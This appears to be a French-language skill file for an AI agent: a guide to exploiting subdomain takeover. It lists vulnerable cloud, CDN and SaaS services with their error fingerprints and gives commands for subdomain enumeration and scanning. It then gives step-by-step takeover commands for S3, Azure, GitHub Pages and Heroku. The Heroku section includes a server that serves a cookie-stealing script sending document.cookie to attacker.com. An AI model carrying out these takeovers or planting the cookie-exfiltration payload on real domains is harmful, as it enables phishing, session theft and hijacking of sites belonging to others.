---
name: subdomain-takeover
description: Guide complet de Subdomain Takeover — DNS CNAME verification, cloud services, automation, outils, détection et exploitation
---

# Subdomain Takeover — Guide d'Exploitation Avancé

## Références principales
- **HackTricks** : https://hacktricks.wiki/en/pentesting-web/domain-subdomain-takeover/
- **EdOverflow** : https://github.com/EdOverflow/can-i-take-over-xyz
- **HackerOne Reports** : https://hackerone.com/hacktivity?querystring=subdomain%20takeover

---

## 1. Concepts fondamentaux

Un sous-domaine pointe vers un service externe (CNAME) via DNS. Si le service est supprimé ou n'est plus attaché au compte, n'importe qui peut le revendiquer.

### Exemple type

```
# DNS : sub.victim.com CNAME → target.azurewebsites.net

# 1. La ressource target.azurewebsites.net est supprimée
# 2. L'attaquant crée target.azurewebsites.net sur Azure
# 3. sub.victim.com pointe maintenant vers le serveur de l'attaquant
# 4. L'attaquant peut héberger du contenu malveillant sur sub.victim.com
```

---

## 2. Services vulnérables

### 2.1 Cloud Providers

| Service | CNAME / Record | Vérification |
|---------|---------------|--------------|
| AWS S3 | `<bucket>.s3.amazonaws.com` | Error NoSuchBucket |
| AWS CloudFront | `dxxxx.cloudfront.net` | Error (NXDOMAIN) |
| AWS ELB | `xxxx-xxxx.elb.amazonaws.com` | 404 ELB not found |
| Azure | `*.azurewebsites.net`, `*.azurefd.net` | 404 page |
| Azure CDN | `*.azureedge.net` | 404 error |
| GCP Storage | `storage.googleapis.com` | 404 NoSuchBucket |
| GCP App Engine | `*.appspot.com` | 404 |
| Oracle Cloud | `*.oraclecloud.com` | 404 |

### 2.2 CDN & DNS Providers

| Service | CNAME | Indicateur |
|---------|-------|-----------|
| Cloudflare | `*.cloudflare.com` | Domain not found |
| Fastly | `*.fastly.net` | Fastly error |
| Akamai | `*.akamaiedge.net` | Akamai error |
| KeyCDN | `*.kxcdn.com` | Invalid domain |
| BunnyCDN | `*.bunnycdn.com` | 404 |
| Shopify | `*.myshopify.com` | No shop |
| Squarespace | `<guid>.squarespace.com` | 404 |
| Heroku | `*.herokuapp.com` | No such app |
| GitHub Pages | `*.github.io` | 404 |
| GitLab Pages | `*.gitlab.io` | 404 |
| Bitbucket | `*.bitbucket.io` | 404 |
| Surge.sh | `*.surge.sh` | Not found |
| Netlify | `*.netlify.app` | No such site |
| Vercel | `*.vercel.app` | 404 |
| Pantheon | `*.pantheonsite.io` | No such site |

### 2.3 SaaS & Others

| Service | CNAME | Vérification |
|---------|-------|-------------|
| Freshdesk | `*.freshdesk.com` | 404 not found |
| Zendesk | `*.zendesk.com` | 404 Help Center |
| Helpscout | `*.helpscoutdocs.com` | Page not found |
| SendGrid | `*.sendgrid.net` | 404 |
| Mailgun | `*.mailgun.org` | Domain not found |
| Intercom | `*.custom.intercom.help` | 404 |
| Readme.io | `*.readme.io` | Project not found |
| Readthedocs | `*.readthedocs.io` | 404 |
| Atlassian | `*.atlassian.net` | Site unavailable |
| Notion | `*.notion.site` | 404 |
| Ghost | `*.ghost.io` | 404 |

---

## 3. Détection automatique

### 3.1 Scan DNS

```bash
# subfinder
subfinder -d victim.com -all -recursive -o subdomains.txt

# assetfinder
assetfinder --subs-only victim.com | tee subdomains.txt

# amass
amass enum -d victim.com -o amass_subs.txt

# chaîne complète
cat subdomains.txt | sort -u > all_subs.txt
```

### 3.2 Vérification CNAME

```bash
# Résoudre chaque sous-domaine et vérifier CNAME
for sub in $(cat all_subs.txt); do
  cname=$(dig +short CNAME $sub)
  if [ -n "$cname" ]; then
    echo "[+] $sub → $cname"
  fi
done

# Ou avec host
cat all_subs.txt | while read sub; do
  host -t CNAME $sub 2>/dev/null | grep "is an alias"
done
```

### 3.3 Vérification des réponses

```bash
# Vérifier les codes HTTP 404 / erreurs spécifiques
cat all_subs.txt | while read sub; do
  response=$(curl -sk -o /dev/null -w "%{http_code}" https://$sub 2>/dev/null)
  if [ "$response" = "404" ]; then
    echo "[+] 404: $sub"
  fi
done
```

### 3.4 Outils automatisés

```bash
# nuclei - Subdomain Takeover templates
nuclei -l all_subs.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# subover — Subdomain takeover scanner
git clone https://github.com/Ice3man543/SubOver.git
cd SubOver
go build
./SubOver -l all_subs.txt

# subjack
git clone https://github.com/haccer/subjack.git
subjack -w all_subs.txt -t 100 -timeout 10 -o takeovers.txt -ssl

# takeover — Go scanner
git clone https://github.com/anttiviljami/takeover.git
takeover -l all_subs.txt

# can-i-take-over-xyz (checklist à jour)
curl -s https://raw.githubusercontent.com/EdOverflow/can-i-take-over-xyz/master/services.json | jq -r '.[].name'
```

---

## 4. Exploitation

### 4.1 AWS S3 Takeover

```bash
# Vérifier
aws s3 ls s3://victim-bucket --no-sign-request 2>&1 | grep -i "NoSuchBucket"

# Créer le bucket
aws s3 mb s3://victim-bucket --region us-east-1

# Uploader du contenu malveillant
echo "<script>alert('Poisoned')</script>" > index.html
aws s3 cp index.html s3://victim-bucket/
aws s3 website s3://victim-bucket/ --index-document index.html

# OU : Policy permettant l'accès public
aws s3api put-bucket-policy --bucket victim-bucket --policy '{
  "Version":"2012-10-17",
  "Statement":[{
    "Sid":"PublicReadGetObject",
    "Effect":"Allow",
    "Principal":"*",
    "Action":["s3:GetObject"],
    "Resource":["arn:aws:s3:::victim-bucket/*"]
  }]
}'
```

### 4.2 Azure Takeover

```bash
# Vérifier
curl -sI https://sub.victim.com | grep -i "azure"

# Créer l'App Service (Azure CLI)
az webapp create \
  --resource-group attacker-rg \
  --plan attacker-plan \
  --name target-name \
  --runtime "node|14-lts"

# Uploader contenu
az webapp deployment source config-zip \
  --resource-group attacker-rg \
  --name target-name \
  --src malicious.zip
```

### 4.3 GitHub Pages Takeover

```bash
# Vérifier
curl -sI https://victim.github.io | grep -i "404"

# Créer le repo avec ce nom
gh repo create victim --public
git clone https://github.com/USER/victim
echo "<script>alert('XSS via subdomain')</script>" > index.html
git add index.html
git commit -m "Takeover"
git push origin main
# Activer GitHub Pages dans les settings
```

### 4.4 Heroku Takeover

```bash
# Vérifier
curl -s https://sub.victim.com | grep -i "no such app"

# Déployer sur Heroku
heroku create target-name
git init
echo "node_modules/" > .gitignore
cat > index.js << 'EOF'
const http = require('http');
http.createServer((req, res) => {
  res.writeHead(200, {'Content-Type': 'text/html'});
  res.end('<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>');
}).listen(process.env.PORT);
EOF
echo '{"name":"app","scripts":{"start":"node index.js"}}' > package.json
git add .
git commit -m "takeover"
git push heroku main
```

---

## 5. Impact

| Impact | Description |
|--------|-------------|
| **Phishing** | Page de login du sous-domaine |
| **Cookie Theft** | Vol de cookies (domaine légitime) |
| **XSS** | Exécution JS sur l'origine victim.com |
| **DNS Rebinding** | Exploitation de la confiance DNS |
| **SPF/DKIM Bypass** | Emailing depuis le domaine |
| **SSL/TLS** | Certificat valide via Let's Encrypt |
| **SEO Poisoning** | Contenu malveillant indexé |

---

## 6. Checklist

```
RECONNAISSANCE
☐ Énumération complète des sous-domaines (subfinder, amass, assetfinder)
☐ Résolution DNS de chaque sous-domaine
☐ Identification des CNAME vers services tiers
☐ Scan HTTP(s) de chaque sous-domaine (200, 404, NXDOMAIN)
☐ Vérification des DNS zone (axfr possible ?)

VÉRIFICATION
☐ Service cible : erreur NoSuchBucket, 404, NXDOMAIN ?
☐ Service supprimé / non attaché ?
☐ Peut-on créer/reserve le service ?
☐ Le service nécessite-t-il une vérification (email, DNS TXT) ?
☐ Délai entre création et prise de contrôle ?

EXPLOITATION
☐ Création du service cloud
☐ Upload de contenu malveillant
☐ Attente TTL DNS pour propagation
☐ Vérification que le contenu est servi

SERVICES À TESTER
☐ AWS S3, CloudFront, ELB
☐ Azure App Service, CDN, Traffic Manager
☐ GCP Storage, App Engine
☐ GitHub Pages, GitLab Pages
☐ Heroku, Netlify, Vercel, Surge
☐ Shopify, Squarespace, Ghost
☐ Freshdesk, Zendesk, Helpscout
☐ Cloudflare, Fastly, Akamai
```